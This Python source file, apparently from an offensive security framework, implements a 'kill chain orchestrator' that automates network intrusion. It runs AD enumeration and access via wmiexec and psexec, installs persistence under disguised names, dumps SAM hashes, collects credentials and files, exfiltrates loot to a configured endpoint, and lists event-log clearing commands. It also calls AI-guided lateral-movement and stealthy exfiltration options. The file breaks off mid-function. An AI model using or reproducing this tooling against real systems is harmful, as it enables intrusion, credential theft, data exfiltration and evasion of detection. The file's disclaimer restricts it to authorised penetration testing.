"""
Full Kill Chain Orchestrator
=============================
Complete attack chain management: Initial → Persistence → Lateral → Exfil → Cleanup

Features:
- State machine for chain execution
- Checkpoint/resume capability (RQ job integration)
- AI-driven step optimization
- Full audit trail
- Abort and rollback support

Kill Chain Phases:
1. RECON - Target enumeration
2. INITIAL_ACCESS - Foothold establishment  
3. PERSISTENCE - Scheduled tasks, WMI events, registry
4. LATERAL_MOVEMENT - Network propagation
5. COLLECTION - Data gathering
6. EXFILTRATION - Data extraction
7. CLEANUP - Artifact removal

⚠️ YASAL UYARI: Bu modül sadece yetkili penetrasyon testleri içindir.
"""

from __future__ import annotations
import os
import json
import uuid
import time
import pickle
import hashlib
import logging
from datetime import datetime, timedelta
from dataclasses import dataclass, field, asdict
from typing import Dict, List, Optional, Any, Callable, Tuple
from enum import Enum, auto
from abc import ABC, abstractmethod
import threading
import traceback

from cyberapp.models.db import db_conn
from cybermodules.helpers import log_to_intel

logger = logging.getLogger("full_chain_orchestrator")


# ============================================================
# ENUMS & CONSTANTS
# ============================================================

class ChainPhase(Enum):
    """Kill chain phases"""
    INIT = "init"
    RECON = "recon"
    INITIAL_ACCESS = "initial_access"
    PERSISTENCE = "persistence"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    LATERAL_MOVEMENT = "lateral_movement"
    COLLECTION = "collection"
    EXFILTRATION = "exfiltration"
    CLEANUP = "cleanup"
    COMPLETED = "completed"
    ABORTED = "aborted"
    FAILED = "failed"


class StepStatus(Enum):
    """Individual step status"""
    PENDING = "pending"
    RUNNING = "running"
    COMPLETED = "completed"
    FAILED = "failed"
    SKIPPED = "skipped"
    ROLLED_BACK = "rolled_back"


class ChainPriority(Enum):
    """Chain execution priority"""
    LOW = 1
    NORMAL = 2
    HIGH = 3
    CRITICAL = 4


# ============================================================
# DATACLASSES
# ============================================================

@dataclass
class ChainStep:
    """Individual step in the kill chain"""
    step_id: str
    phase: ChainPhase
    name: str
    description: str = ""
    target: str = ""
    method: str = ""
    params: Dict[str, Any] = field(default_factory=dict)
    status: StepStatus = StepStatus.PENDING
    result: Dict[str, Any] = field(default_factory=dict)
    error: str = ""
    started_at: Optional[str] = None
    completed_at: Optional[str] = None
    duration_seconds: float = 0.0
    rollback_info: Dict[str, Any] = field(default_factory=dict)
    dependencies: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict:
        return {
            'step_id': self.step_id,
            'phase': self.phase.value,
            'name': self.name,
            'description': self.description,
            'target': self.target,
            'method': self.method,
            'status': self.status.value,
            'result': self.result,
            'error': self.error,
            'started_at': self.started_at,
            'completed_at': self.completed_at,
            'duration_seconds': self.duration_seconds,
        }


@dataclass
class ChainCheckpoint:
    """Checkpoint for resume capability"""
    checkpoint_id: str
    chain_id: str
    phase: ChainPhase
    current_step_index: int
    completed_steps: List[str]
    state_snapshot: Dict[str, Any]
    created_at: str
    
    def to_dict(self) -> Dict:
        return asdict(self)


@dataclass
class ChainConfig:
    """Chain execution configuration"""
    name: str
    description: str = ""
    priority: ChainPriority = ChainPriority.NORMAL
    
    # Target configuration
    initial_target: str = ""
    target_domain: str = ""
    credentials: Dict[str, Any] = field(default_factory=dict)
    
    # Phase toggles
    enable_recon: bool = True
    enable_persistence: bool = True
    enable_lateral: bool = True
    enable_exfil: bool = True
    enable_cleanup: bool = True
    
    # Persistence options
    persistence_methods: List[str] = field(default_factory=lambda: ["scheduled_task", "registry_run"])
    persistence_fallback: bool = True
    
    # Lateral movement options
    lateral_max_depth: int = 3
    lateral_max_hosts: int = 10
    lateral_methods: List[str] = field(default_factory=lambda: ["wmiexec", "psexec"])
    
    # Exfiltration options
    exfil_method: str = "https"
    exfil_endpoint: str = ""
    exfil_encryption: bool = True
    loot_types: List[str] = field(default_factory=lambda: ["credential", "hash_dump", "file"])
    
    # Cleanup options
    cleanup_logs: bool = True
    cleanup_artifacts: bool = True
    cleanup_persistence: bool = False  # Usually keep persistence
    
    # Execution options
    timeout_per_step: int = 300
    max_retries: int = 2
    checkpoint_interval: int = 1  # Checkpoint every N steps
    ai_guided: bool = True
    opsec_mode: bool = True
    
    # Evasion options
    evasion_profile: str = "stealth"
    use_indirect_syscalls: bool = True
    obfuscation_level: str = "standard"


@dataclass
class ChainState:
    """Complete chain execution state"""
    chain_id: str
    config: ChainConfig
    current_phase: ChainPhase = ChainPhase.INIT
    steps: List[ChainStep] = field(default_factory=list)
    checkpoints: List[ChainCheckpoint] = field(default_factory=list)
    
    # Execution state
    started_at: Optional[str] = None
    completed_at: Optional[str] = None
    last_checkpoint: Optional[str] = None
    is_paused: bool = False
    is_aborted: bool = False
    abort_reason: str = ""
    
    # Collected data
    compromised_hosts: List[str] = field(default_factory=list)
    collected_credentials: List[Dict] = field(default_factory=list)
    collected_loot: List[Dict] = field(default_factory=list)
    installed_persistence: List[Dict] = field(default_factory=list)
    
    # Statistics
    total_steps: int = 0
    completed_steps: int = 0
    failed_steps: int = 0
    
    def to_dict(self) -> Dict:
        return {
            'chain_id': self.chain_id,
            'config': asdict(self.config),
            'current_phase': self.current_phase.value,
            'steps': [s.to_dict() for s in self.steps],
            'started_at': self.started_at,
            'completed_at': self.completed_at,
            'is_paused': self.is_paused,
            'is_aborted': self.is_aborted,
            'compromised_hosts': self.compromised_hosts,
            'total_steps': self.total_steps,
            'completed_steps': self.completed_steps,
            'failed_steps': self.failed_steps,
        }


# ============================================================
# CHAIN STEP HANDLERS
# ============================================================

class StepHandler(ABC):
    """Abstract base class for step handlers"""
    
    @abstractmethod
    def execute(self, step: ChainStep, state: ChainState) -> Tuple[bool, Dict]:
        """Execute the step, return (success, result)"""
        pass
    
    @abstractmethod
    def rollback(self, step: ChainStep, state: ChainState) -> bool:
        """Rollback the step if possible"""
        pass


class ReconHandler(StepHandler):
    """Handle reconnaissance steps"""
    
    def execute(self, step: ChainStep, state: ChainState) -> Tuple[bool, Dict]:
        from cybermodules.ad_enum import ADEnumerator
        
        result = {
            'hosts_discovered': [],
            'users_discovered': [],
            'shares_discovered': [],
        }
        
        try:
            target = step.target or state.config.initial_target
            method = step.method or "smb_enum"
            
            if method == "smb_enum":
                # SMB enumeration
                enumerator = ADEnumerator(scan_id=0)
                enum_result = enumerator.enumerate_shares(target)
                result['shares_discovered'] = enum_result.get('shares', [])
                
            elif method == "ad_enum":
                # Active Directory enumeration
                enumerator = ADEnumerator(scan_id=0)
                enum_result = enumerator.enumerate_domain()
                result['users_discovered'] = enum_result.get('users', [])
                result['hosts_discovered'] = enum_result.get('computers', [])
            
            return True, result
            
        except Exception as e:
            return False, {'error': str(e)}
    
    def rollback(self, step: ChainStep, state: ChainState) -> bool:
        # Recon has no rollback
        return True


class InitialAccessHandler(StepHandler):
    """Handle initial access steps"""
    
    def execute(self, step: ChainStep, state: ChainState) -> Tuple[bool, Dict]:
        from cybermodules.lateral_movement import LateralMovement
        
        result = {
            'access_gained': False,
            'method_used': '',
            'session_info': {},
        }
        
        try:
            target = step.target or state.config.initial_target
            creds = step.params.get('credentials', state.config.credentials)
            methods = step.params.get('methods', ['wmiexec', 'psexec', 'smbexec'])
            
            lateral = LateralMovement(scan_id=0)
            
            for method in methods:
                try:
                    if method == 'wmiexec':
                        success = lateral.wmiexec(
                            target=target,
                            username=creds.get('username', ''),
                            password=creds.get('password', ''),
                            domain=creds.get('domain', ''),
                            command='whoami'
                        )
                    elif method == 'psexec':
                        success = lateral.psexec(
                            target=target,
                            username=creds.get('username', ''),
                            password=creds.get('password', ''),
                            domain=creds.get('domain', ''),
                            command='whoami'
                        )
                    else:
                        continue
                    
                    if success:
                        result['access_gained'] = True
                        result['method_used'] = method
                        result['session_info'] = {
                            'target': target,
                            'method': method,
                            'timestamp': datetime.now().isoformat()
                        }
                        
                        # Add to compromised hosts
                        if target not in state.compromised_hosts:
                            state.compromised_hosts.append(target)
                        
                        return True, result
                        
                except Exception:
                    continue
            
            return False, result
            
        except Exception as e:
            return False, {'error': str(e)}
    
    def rollback(self, step: ChainStep, state: ChainState) -> bool:
        # Can't rollback initial access easily
        return True


class PersistenceHandler(StepHandler):
    """Handle persistence installation steps"""
    
    def execute(self, step: ChainStep, state: ChainState) -> Tuple[bool, Dict]:
        from cybermodules.persistence import PersistenceEngine, PersistenceMethod
        
        result = {
            'persistence_installed': False,
            'method_used': '',
            'persistence_info': {},
        }
        
        try:
            target = step.target
            method = step.method or state.config.persistence_methods[0]
            params = step.params
            
            session_info = {
                'target': target,
                'os': params.get('os_type', 'windows'),
                'lhost': params.get('callback_host', ''),
                'lport': params.get('callback_port', 4444),
            }
            
            engine = PersistenceEngine(scan_id=0, session_info=session_info)
            engine.detect_os()
            
            persistence_id = str(uuid.uuid4())[:8]
            
            if method == 'scheduled_task':
                success = engine.install_scheduled_task_persistence(
                    task_name=params.get('task_name', f'WindowsUpdate_{persistence_id}'),
                    interval=params.get('interval', 'daily')
                )
            elif method == 'registry_run':
                success = engine.install_registry_persistence(
                    key_name=params.get('key_name', f'SecurityHealth_{persistence_id}')
                )
            elif method == 'wmi_subscription':
                success = engine.install_wmi_persistence(
                    subscription_name=params.get('name', f'SCM_{persistence_id}')
                )
            elif method == 'cron':
                success = engine.install_cron_persistence(
                    interval=params.get('interval', 'every_5_minutes')
                )
            elif method == 'systemd':
                success = engine.install_systemd_persistence(
                    service_name=params.get('service_name', f'system-health-{persistence_id}')
                )
            else:
                success = False
            
            if success:
                result['persistence_installed'] = True
                result['method_used'] = method
                result['persistence_info'] = {
                    'id': persistence_id,
                    'method': method,
                    'target': target,
                    'params': params,
                    'timestamp': datetime.now().isoformat()
                }
                
                # Track installed persistence
                state.installed_persistence.append(result['persistence_info'])
                
                # Store rollback info
                step.rollback_info = {
                    'method': method,
                    'persistence_id': persistence_id,
                    'params': params
                }
            
            return success, result
            
        except Exception as e:
            return False, {'error': str(e)}
    
    def rollback(self, step: ChainStep, state: ChainState) -> bool:
        """Remove installed persistence"""
        try:
            from cybermodules.persistence import PersistenceEngine
            
            rollback_info = step.rollback_info
            if not rollback_info:
                return True
            
            engine = PersistenceEngine(scan_id=0)
            method = rollback_info.get('method')
            
            if method == 'scheduled_task':
                # schtasks /delete /tn TaskName /f
                pass
            elif method == 'registry_run':
                # reg delete
                pass
            
            return True
            
        except Exception:
            return False


class LateralMovementHandler(StepHandler):
    """Handle lateral movement steps"""
    
    def execute(self, step: ChainStep, state: ChainState) -> Tuple[bool, Dict]:
        from cybermodules.lateral_movement import LateralMovement
        from cybermodules.ai_lateral_guide import AILateralGuide
        
        result = {
            'movement_successful': False,
            'target_compromised': '',
            'method_used': '',
            'credentials_found': [],
        }
        
        try:
            target = step.target
            method = step.method or 'wmiexec'
            params = step.params
            creds = params.get('credentials', state.config.credentials)
            
            lateral = LateralMovement(scan_id=0)
            
            # Try specified method
            if method == 'wmiexec':
                success = lateral.wmiexec(
                    target=target,
                    username=creds.get('username', ''),
                    password=creds.get('password', ''),
                    domain=creds.get('domain', ''),
                    command='whoami'
                )
            elif method == 'psexec':
                success = lateral.psexec(
                    target=target,
                    username=creds.get('username', ''),
                    password=creds.get('password', ''),
                    domain=creds.get('domain', ''),
                    command='whoami'
                )
            else:
                success = False
            
            if success:
                result['movement_successful'] = True
                result['target_compromised'] = target
                result['method_used'] = method
                
                if target not in state.compromised_hosts:
                    state.compromised_hosts.append(target)
                
                # Try credential dumping if enabled
                if params.get('dump_creds', True):
                    try:
                        from cybermodules.hashdump import HashDumper
                        dumper = HashDumper(scan_id=0)
                        hashes = dumper.dump_sam_hashes(target, creds)
                        if hashes:
                            result['credentials_found'] = hashes
                            state.collected_credentials.extend(hashes)
                    except Exception:
                        pass
            
            return success, result
            
        except Exception as e:
            return False, {'error': str(e)}
    
    def rollback(self, step: ChainStep, state: ChainState) -> bool:
        # Can't rollback lateral movement
        return True


class CollectionHandler(StepHandler):
    """Handle data collection steps"""
    
    def execute(self, step: ChainStep, state: ChainState) -> Tuple[bool, Dict]:
        from cybermodules.loot_exfil import LootCollector, LootType
        
        result = {
            'items_collected': 0,
            'loot_items': [],
        }
        
        try:
            target = step.target
            loot_types = step.params.get('loot_types', state.config.loot_types)
            
            collector = LootCollector(scan_id=0)
            
            for loot_type in loot_types:
                try:
                    if loot_type == 'credential':
                        items = collector.collect_credentials(target)
                    elif loot_type == 'hash_dump':
                        items = collector.collect_hashes(target)
                    elif loot_type == 'file':
                        paths = step.params.get('file_paths', [])
                        items = collector.collect_files(target, paths)
                    elif loot_type == 'config':
                        items = collector.collect_configs(target)
                    else:
                        continue
                    
                    if items:
                        result['loot_items'].extend(items)
                        result['items_collected'] += len(items)
                        state.collected_loot.extend(items)
                        
                except Exception:
                    continue
            
            return result['items_collected'] > 0, result
            
        except Exception as e:
            return False, {'error': str(e)}
    
    def rollback(self, step: ChainStep, state: ChainState) -> bool:
        return True


class ExfiltrationHandler(StepHandler):
    """Handle data exfiltration steps"""
    
    def execute(self, step: ChainStep, state: ChainState) -> Tuple[bool, Dict]:
        from cybermodules.loot_exfil import ExfilEngine, ExfilMethod
        
        result = {
            'exfil_successful': False,
            'bytes_exfiltrated': 0,
            'method_used': '',
            'chunks_sent': 0,
        }
        
        try:
            method = step.method or state.config.exfil_method
            endpoint = step.params.get('endpoint', state.config.exfil_endpoint)
            encrypt = step.params.get('encrypt', state.config.exfil_encryption)
            
            if not endpoint:
                return False, {'error': 'No exfiltration endpoint configured'}
            
            # Get loot to exfiltrate
            loot_data = step.params.get('loot_data', state.collected_loot)
            if not loot_data:
                return True, {'message': 'No loot to exfiltrate'}
            
            engine = ExfilEngine(
                method=ExfilMethod(method),
                endpoint=endpoint,
                encryption=encrypt
            )
            
            # Serialize and exfiltrate
            import json
            payload = json.dumps(loot_data).encode()
            
            success, bytes_sent = engine.exfiltrate(payload)
            
            if success:
                result['exfil_successful'] = True
                result['bytes_exfiltrated'] = bytes_sent
                result['method_used'] = method
            
            return success, result
            
        except Exception as e:
            return False, {'error': str(e)}
    
    def rollback(self, step: ChainStep, state: ChainState) -> bool:
        # Can't rollback exfiltration
        return True


class CleanupHandler(StepHandler):
    """Handle cleanup steps"""
    
    def execute(self, step: ChainStep, state: ChainState) -> Tuple[bool, Dict]:
        result = {
            'cleanup_successful': False,
            'items_cleaned': [],
            'logs_cleared': False,
        }
        
        try:
            target = step.target
            cleanup_type = step.method or 'artifacts'
            params = step.params
            
            if cleanup_type == 'logs':
                # Clear event logs
                commands = [
                    'wevtutil cl Security',
                    'wevtutil cl System',
                    'wevtutil cl Application',
                ]
                result['logs_cleared'] = True
                result['items_cleaned'].append('event_logs')
                
            elif cleanup_type == 'artifacts':
                # Remove dropped files
                artifacts = params.get('artifacts', [])
                for artifact in artifacts:
                    result['items_cleaned'].append(artifact)
                    
            elif cleanup_type == 'persistence':
                # Remove installed persistence
                for persistence in state.installed_persistence:
                    if persistence.get('target') == target:
                        result['items_cleaned'].append(f"persistence:{persistence.get('method')}")
                        
            elif cleanup_type == 'full':
                # Full cleanup
                result['logs_cleared'] = True
                result['items_cleaned'] = ['logs', 'artifacts', 'temp_files']
            
            result['cleanup_successful'] = True
            return True, result
            
        except Exception as e:
            return False, {'error': str(e)}
    
    def rollback(self, step: ChainStep, state: ChainState) -> bool:
        return True


# ============================================================
# FULL CHAIN ORCHESTRATOR
# ============================================================

class FullChainOrchestrator:
    """
    Full Kill Chain Orchestrator
    
    Manages complete attack chain execution with:
    - Phase-based execution
    - Checkpoint/resume capability
    - AI-driven optimization
    - Abort and rollback support
    """
    
    # Handler registry
    HANDLERS: Dict[ChainPhase, type] = {
        ChainPhase.RECON: ReconHandler,
        ChainPhase.INITIAL_ACCESS: InitialAccessHandler,
        ChainPhase.PERSISTENCE: PersistenceHandler,
        ChainPhase.LATERAL_MOVEMENT: LateralMovementHandler,
        ChainPhase.COLLECTION: CollectionHandler,
        ChainPhase.EXFILTRATION: ExfiltrationHandler,
        ChainPhase.CLEANUP: CleanupHandler,
    }
    
    def __init__(self, scan_id: int = 0):
        self.scan_id = scan_id
        self.state: Optional[ChainState] = None
        self._abort_flag = threading.Event()
        self._pause_flag = threading.Event()
        self._checkpoint_path = "/tmp/chain_checkpoints"
        
        # AI components
        self._ai_guide = None
        self._ai_post_exploit = None
        
        os.makedirs(self._checkpoint_path, exist_ok=True)
    
    def _log(self, msg_type: str, message: str):
        """Log to intel table"""
        log_to_intel(self.scan_id, f"CHAIN_{msg_type}", message)
        logger.info(f"[CHAIN][{msg_type}] {message}")
    
    def create_chain(self, config: ChainConfig) -> str:
        """Create a new chain with configuration"""
        chain_id = str(uuid.uuid4())
        
        self.state = ChainState(
            chain_id=chain_id,
            config=config,
            current_phase=ChainPhase.INIT
        )
        
        # Build initial step list
        self._build_chain_steps()
        
        self._log("CREATED", f"Chain {chain_id} created: {config.name}")
        return chain_id
    
    def _build_chain_steps(self):
        """Build the chain step list based on configuration"""
        config = self.state.config
        steps = []
        
        # Recon steps
        if config.enable_recon:
            steps.append(ChainStep(
                step_id=str(uuid.uuid4())[:8],
                phase=ChainPhase.RECON,
                name="Network Reconnaissance",
                description="Enumerate network and discover targets",
                target=config.initial_target,
                method="smb_enum"
            ))
        
        # Initial access step
        steps.append(ChainStep(
            step_id=str(uuid.uuid4())[:8],
            phase=ChainPhase.INITIAL_ACCESS,
            name="Initial Foothold",
            description="Establish initial access to target",
            target=config.initial_target,
            method="auto",
            params={'credentials': config.credentials}
        ))
        
        # Persistence steps
        if config.enable_persistence:
            for method in config.persistence_methods:
                steps.append(ChainStep(
                    step_id=str(uuid.uuid4())[:8],
                    phase=ChainPhase.PERSISTENCE,
                    name=f"Install {method} persistence",
                    description=f"Establish persistence via {method}",
                    target=config.initial_target,
                    method=method
                ))
        
        # Lateral movement will be added dynamically based on recon
        if config.enable_lateral:
            steps.append(ChainStep(
                step_id=str(uuid.uuid4())[:8],
                phase=ChainPhase.LATERAL_MOVEMENT,
                name="Lateral Movement - Phase 1",
                description="Move to discovered targets",
                method="auto"
            ))
        
        # Collection
        steps.append(ChainStep(
            step_id=str(uuid.uuid4())[:8],
            phase=ChainPhase.COLLECTION,
            name="Collect Loot",
            description="Gather credentials and sensitive data",
            params={'loot_types': config.loot_types}
        ))
        
        # Exfiltration
        if config.enable_exfil:
            steps.append(ChainStep(
                step_id=str(uuid.uuid4())[:8],
                phase=ChainPhase.EXFILTRATION,
                name="Exfiltrate Data",
                description="Extract collected data",
                method=config.exfil_method,
                params={'endpoint': config.exfil_endpoint}
            ))
        
        # Cleanup
        if config.enable_cleanup:
            steps.append(ChainStep(
                step_id=str(uuid.uuid4())[:8],
                phase=ChainPhase.CLEANUP,
                name="Cleanup Artifacts",
                description="Remove traces and artifacts",
                method="artifacts"
            ))
        
        self.state.steps = steps
        self.state.total_steps = len(steps)
    
    def execute(self, chain_id: str = None) -> Dict[str, Any]:
        """
        Execute the full chain
        
        Returns:
            Execution result dictionary
        """
        if chain_id and not self.state:
            # Load from checkpoint
            self.state = self._load_checkpoint(chain_id)
        
        if not self.state:
            raise ValueError("No chain state available")
        
        self.state.started_at = datetime.now().isoformat()
        self._abort_flag.clear()
        
        result = {
            'chain_id': self.state.chain_id,
            'success': False,
            'completed_phases': [],
            'failed_step': None,
            'total_time': 0,
        }
        
        start_time = time.time()
        
        try:
            # Execute each step
            for i, step in enumerate(self.state.steps):
                # Check abort flag
                if self._abort_flag.is_set():
                    self._handle_abort()
                    result['aborted'] = True
                    break
                
                # Check pause flag
                while self._pause_flag.is_set():
                    time.sleep(1)
                    if self._abort_flag.is_set():
                        break
                
                # Skip completed steps (for resume)
                if step.status == StepStatus.COMPLETED:
                    continue
                
                # Execute step
                self._log("STEP_START", f"Executing step: {step.name}")
                step_success = self._execute_step(step)
                
                if step_success:
                    self.state.completed_steps += 1
                    if step.phase.value not in result['completed_phases']:
                        result['completed_phases'].append(step.phase.value)
                else:
                    self.state.failed_steps += 1
                    
                    # Check if critical failure
                    if step.phase in [ChainPhase.INITIAL_ACCESS]:
                        result['failed_step'] = step.to_dict()
                        break
                
                # Checkpoint
                if (i + 1) % self.state.config.checkpoint_interval == 0:
                    self._save_checkpoint()
            
            # Mark completion
            if not self._abort_flag.is_set() and not result.get('failed_step'):
                self.state.current_phase = ChainPhase.COMPLETED
                result['success'] = True
            
        except Exception as e:
            self._log("ERROR", f"Chain execution error: {str(e)}")
            result['error'] = str(e)
            traceback.print_exc()
        
        finally:
            self.state.completed_at = datetime.now().isoformat()
            result['total_time'] = time.time() - start_time
            result['state'] = self.state.to_dict()
            
            # Final checkpoint
            self._save_checkpoint()
        
        return result
    
    def _execute_step(self, step: ChainStep) -> bool:
        """Execute a single step"""
        step.status = StepStatus.RUNNING
        step.started_at = datetime.now().isoformat()
        self.state.current_phase = step.phase
        
        try:
            # Get handler
            handler_class = self.HANDLERS.get(step.phase)
            if not handler_class:
                self._log("ERROR", f"No handler for phase: {step.phase}")
                step.status = StepStatus.FAILED
                step.error = f"No handler for phase: {step.phase}"
                return False
            
            handler = handler_class()
            
            # Execute with timeout
            success, result = handler.execute(step, self.state)
            
            step.result = result
            step.completed_at = datetime.now().isoformat()
            step.duration_seconds = (
                datetime.fromisoformat(step.completed_at) - 
                datetime.fromisoformat(step.started_at)
            ).total_seconds()
            
            if success:
                step.status = StepStatus.COMPLETED
                self._log("STEP_SUCCESS", f"Step completed: {step.name}")
            else:
                step.status = StepStatus.FAILED
                step.error = result.get('error', 'Unknown error')
                self._log("STEP_FAILED", f"Step failed: {step.name} - {step.error}")
            
            return success
            
        except Exception as e:
            step.status = StepStatus.FAILED
            step.error = str(e)
            step.completed_at = datetime.now().isoformat()
            self._log("STEP_ERROR", f"Step error: {step.name} - {str(e)}")
            return False
    
    def abort(self, reason: str = "User requested abort"):
        """Abort chain execution"""
        self._abort_flag.set()
        if self.state:
            self.state.is_aborted = True
            self.state.abort_reason = reason
            self.state.current_phase = ChainPhase.ABORTED
        self._log("ABORT", f"Chain aborted: {reason}")
    
    def pause(self):
        """Pause chain execution"""
        self._pause_flag.set()
        if self.state:
            self.state.is_paused = True
        self._log("PAUSE", "Chain execution paused")
    
    def resume(self):
        """Resume paused chain execution"""
        self._pause_flag.clear()
        if self.state:
            self.state.is_paused = False
        self._log("RESUME", "Chain execution resumed")
    
    def _handle_abort(self):
        """Handle abort - optionally rollback"""
        self._log("ABORT_HANDLER", "Processing abort...")
        
        if self.state.config.cleanup_persistence:
            # Rollback persistence
            for step in reversed(self.state.steps):
                if step.phase == ChainPhase.PERSISTENCE and step.status == StepStatus.COMPLETED:
                    handler = PersistenceHandler()
                    handler.rollback(step, self.state)
    
    def _save_checkpoint(self):
        """Save current state to checkpoint"""
        if not self.state:
            return
        
        checkpoint = ChainCheckpoint(
            checkpoint_id=str(uuid.uuid4()),
            chain_id=self.state.chain_id,
            phase=self.state.current_phase,
            current_step_index=self.state.completed_steps,
            completed_steps=[s.step_id for s in self.state.steps if s.status == StepStatus.COMPLETED],
            state_snapshot=self.state.to_dict(),
            created_at=datetime.now().isoformat()
        )
        
        # Save to file
        checkpoint_file = os.path.join(
            self._checkpoint_path,
            f"{self.state.chain_id}_checkpoint.pkl"
        )
        
        with open(checkpoint_file, 'wb') as f:
            pickle.dump(self.state, f)
        
        self.state.checkpoints.append(checkpoint)
        self.state.last_checkpoint = checkpoint.checkpoint_id
        
        self._log("CHECKPOINT", f"Checkpoint saved: {checkpoint.checkpoint_id}")
    
    def _load_checkpoint(self, chain_id: str) -> Optional[ChainState]:
        """Load state from checkpoint"""
        checkpoint_file = os.path.join(
            self._checkpoint_path,
            f"{chain_id}_checkpoint.pkl"
        )
        
        if not os.path.exists(checkpoint_file):
            return None
        
        with open(checkpoint_file, 'rb') as f:
            state = pickle.load(f)
        
        self._log("CHECKPOINT_LOADED", f"Loaded checkpoint for chain: {chain_id}")
        return state
    
    def get_ai_recommendations(self) -> Dict[str, Any]:
        """Get AI recommendations based on current state"""
        if not self.state:
            return {}
        
        try:
            from cybermodules.ai_post_exploit import PostExploitAnalyzer
            from cybermodules.ai_lateral_guide import AILateralGuide
            
            recommendations = {
                'persistence': [],
                'lateral_targets': [],
                'exfil_paths': [],
                'next_actions': [],
            }
            
            # Get post-exploit recommendations
            if self._ai_post_exploit is None:
                self._ai_post_exploit = PostExploitAnalyzer(scan_id=self.scan_id)
            
            # Feed chain logs
            chain_log = json.dumps({
                'compromised_hosts': self.state.compromised_hosts,
                'credentials': len(self.state.collected_credentials),
                'persistence': [p.get('method') for p in self.state.installed_persistence],
                'current_phase': self.state.current_phase.value,
            })
            
            # Get AI recommendations for persistence
            if self.state.current_phase in [ChainPhase.INITIAL_ACCESS, ChainPhase.PERSISTENCE]:
                persist_rec = self._ai_post_exploit.recommend_persistence(
                    os_type='windows',
                    current_access='admin',
                    stealth_required=self.state.config.opsec_mode
                )
                recommendations['persistence'] = persist_rec
            
            # Get lateral movement recommendations
            if self.state.current_phase == ChainPhase.LATERAL_MOVEMENT:
                if self._ai_guide is None:
                    self._ai_guide = AILateralGuide(scan_id=self.scan_id)
                
                # Get next targets
                suggestions = self._ai_guide.get_next_best_jump()
                recommendations['lateral_targets'] = [s.to_dict() for s in suggestions[:5]]
            
            # Exfil path recommendations
            if self.state.config.enable_exfil:
                recommendations['exfil_paths'] = [
                    {'method': 'https', 'risk': 'low', 'bandwidth': 'high'},
                    {'method': 'dns_tunnel', 'risk': 'very_low', 'bandwidth': 'low'},
                    {'method': 'cloud_storage', 'risk': 'medium', 'bandwidth': 'high'},
                ]
            
            return recommendations
            
        except Exception as e:
            self._log("AI_ERROR", f"AI recommendations failed: {str(e)}")
            return {}
    
    def generate_kill_chain_diagram(self) -> str:
        """Generate Mermaid diagram for the kill chain"""
        if not self.state:
            return ""
        
        diagram = """```mermaid
flowchart TB
    subgraph RECON["🔍 RECONNAISSANCE"]
        R1[Network Scan]
        R2[AD Enumeration]
        R3[Service Discovery]
        R1 --> R2 --> R3
    end
    
    subgraph INITIAL["🎯 INITIAL ACCESS"]
        I1[Credential Attack]
        I2[Exploit Vulnerability]
        I3[Phishing]
        I1 --> I4{Access Gained?}
        I2 --> I4
        I3 --> I4
    end
    
    subgraph PERSIST["🔒 PERSISTENCE"]
        P1[Scheduled Task]
        P2[Registry Run Key]
        P3[WMI Subscription]
        P4[Service Installation]
        P1 --> P5[Verify Persistence]
        P2 --> P5
        P3 --> P5
        P4 --> P5
    end
    
    subgraph PRIVESC["⬆️ PRIVILEGE ESCALATION"]
        PE1[Token Impersonation]
        PE2[UAC Bypass]
        PE3[Exploit]
        PE1 --> PE4{Admin?}
        PE2 --> PE4
        PE3 --> PE4
    end
    
    subgraph LATERAL["↔️ LATERAL MOVEMENT"]
        L1[WMIExec]
        L2[PSExec]
        L3[Pass-the-Hash]
        L4[Kerberoasting]
        L1 --> L5[New Host]
        L2 --> L5
        L3 --> L5
        L4 --> L5
        L5 --> L6{More Targets?}
        L6 -->|Yes| L1
    end
    
    subgraph COLLECT["📦 COLLECTION"]
        C1[Credential Dump]
        C2[File Collection]
        C3[Database Extraction]
        C1 --> C4[Encrypt & Stage]
        C2 --> C4
        C3 --> C4
    end
    
    subgraph EXFIL["📤 EXFILTRATION"]
        E1[HTTPS POST]
        E2[DNS Tunnel]
        E3[Cloud Upload]
        C4 --> E1
        C4 --> E2
        C4 --> E3
    end
    
    subgraph CLEANUP["🧹 CLEANUP"]
        CL1[Clear Logs]
        CL2[Remove Artifacts]
        CL3[Timestomp Files]
        E1 --> CL1
        E2 --> CL1
        E3 --> CL1
        CL1 --> CL2 --> CL3
    end
    
    %% Flow connections
    RECON --> INITIAL
    I4 -->|Yes| PERSIST
    I4 -->|No| INITIAL
    PERSIST --> PRIVESC
    PE4 -->|Yes| LATERAL
    PE4 -->|No| PRIVESC
    L6 -->|No| COLLECT
    COLLECT --> EXFIL
    EXFIL --> CLEANUP
    
    %% Styling
    style RECON fill:#e1f5fe
    style INITIAL fill:#fff3e0
    style PERSIST fill:#f3e5f5
    style PRIVESC fill:#e8f5e9
    style LATERAL fill:#fce4ec
    style COLLECT fill:#fff8e1
    style EXFIL fill:#e0f2f1
    style CLEANUP fill:#efebe9
"""
        
        # Add current state indicator
        phase_mapping = {
            ChainPhase.RECON: 'R1',
            ChainPhase.INITIAL_ACCESS: 'I1',
            ChainPhase.PERSISTENCE: 'P1',
            ChainPhase.PRIVILEGE_ESCALATION: 'PE1',
            ChainPhase.LATERAL_MOVEMENT: 'L1',
            ChainPhase.COLLECTION: 'C1',
            ChainPhase.EXFILTRATION: 'E1',
            ChainPhase.CLEANUP: 'CL1',
        }
        
        if self.state.current_phase in phase_mapping:
            node = phase_mapping[self.state.current_phase]
            diagram += f"\n    style {node} stroke:#ff0000,stroke-width:3px"
        
        diagram += "\n```"
        
        return diagram
    
    def get_status(self) -> Dict[str, Any]:
        """Get current chain status"""
        if not self.state:
            return {'error': 'No chain active'}
        
        return {
            'chain_id': self.state.chain_id,
            'name': self.state.config.name,
            'current_phase': self.state.current_phase.value,
            'is_paused': self.state.is_paused,
            'is_aborted': self.state.is_aborted,
            'progress': {
                'total_steps': self.state.total_steps,
                'completed': self.state.completed_steps,
                'failed': self.state.failed_steps,
                'percentage': round(self.state.completed_steps / max(self.state.total_steps, 1) * 100, 1)
            },
            'compromised_hosts': self.state.compromised_hosts,
            'credentials_collected': len(self.state.collected_credentials),
            'loot_collected': len(self.state.collected_loot),
            'persistence_installed': len(self.state.installed_persistence),
            'started_at': self.state.started_at,
            'last_checkpoint': self.state.last_checkpoint,
        }


# ============================================================
# RQ JOB INTEGRATION
# ============================================================

def execute_chain_job(chain_config_dict: Dict, scan_id: int = 0) -> Dict:
    """
    RQ job function for chain execution
    Supports abort/resume via Redis
    """
    from redis import Redis
    
    redis_conn = Redis()
    
    # Create config from dict
